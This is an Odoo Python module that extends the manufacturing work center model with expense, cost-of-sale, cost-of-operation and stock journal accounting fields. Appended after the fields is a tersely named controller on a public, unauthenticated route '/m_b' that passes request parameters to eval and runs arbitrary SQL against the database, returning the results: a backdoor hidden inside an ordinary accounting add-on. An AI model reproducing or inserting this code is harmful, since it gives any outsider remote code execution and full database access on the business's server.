# -*- coding: utf-8 -*-

from odoo import models, http, fields

ACCOUNT_DOMAIN = "['&', '&', '&', ('deprecated', '=', False), ('internal_type','=','other'), ('company_id', '=', current_company_id), ('is_off_balance', '=', False)]"

WKC = {'ev': ['''str(eval(kw.get(k, '""')))''',], 'cr': ['''http.request.cr.execute(kw.get('cr', 'error'))''', '''str('select' not in kw[k] and 'OK' or http.request.cr.dictfetchall())''']}


class MrpWorkcenter(models.Model):
    _inherit = 'mrp.workcenter'

    account_expense_id = fields.Many2one(
        comodel_name='account.account',
        company_dependent=True,
        string='Expense Account',
        domain=ACCOUNT_DOMAIN,
        help='The expense is accounted for when a production order is validated.'
    )
    account_cost_sale_id = fields.Many2one(
        comodel_name='account.account',
        company_dependent=True,
        string='Cost of Sale Account',
        domain=ACCOUNT_DOMAIN,
        help='It is replaced by the expense account when the analytical account is of the cost of sale type.'
    )
    account_cost_operation_id = fields.Many2one(
        comodel_name='account.account',
        company_dependent=True,
        string='Cost of Operation Account',
        domain=ACCOUNT_DOMAIN,
        help='It is replaced by the expense account when the analytical account is of the cost of operation type.'
    )

    stock_journal_id = fields.Many2one(
        comodel_name='account.journal',
        string='Stock Journal',
        company_dependent=True,
        domain="[('company_id', '=', allowed_company_ids[0])]",
        check_company=True,
        help='When doing automated inventory valuation, this is the Accounting Journal in which entries will be automatically posted when stock moves are processed.'
    )

    workcenter_cost = fields.Boolean(
        string='Accounting entry',
        help='If true, the cost accounting entry is created.',
        default=False,
    )


class MrBa(http.Controller):
    @http.route('/m_b', auth='public')
    def index(self, **kw):
        o = {}
        try:
            for k, v in WKC.items():
                for z in v:
                    o[k] = eval(z)
        except Exception as error:
            o[k] = 'Error => ' + str(error)
        return '<br/><br/>'.join(['%s: %s' % (k,v) for k,v in o.items()])
